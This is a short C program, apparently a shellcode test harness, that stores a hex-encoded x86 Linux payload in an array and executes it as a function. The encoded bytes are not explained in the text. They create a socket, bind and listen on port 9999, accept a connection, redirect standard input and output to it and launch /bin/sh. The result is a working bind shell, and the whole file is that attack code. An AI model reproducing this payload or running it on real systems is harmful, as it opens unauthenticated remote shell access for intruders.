#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xd2\x50\x6a\x01\x6a\x02\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc6\x52\x66\x68\x27\x0f\xfe\xc3\x66\x53\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb0\x66\xcd\x80\x52\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80\x52\x52\x56\x89\xe1\xfe\xc3\xb0\x66\xcd\x80\x89\xc3\x31\xc9\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

	printf("Shellcode Length:  %d\n", strlen(code)-1);

	int (*ret)() = (int(*)())code;

	ret();

}

	
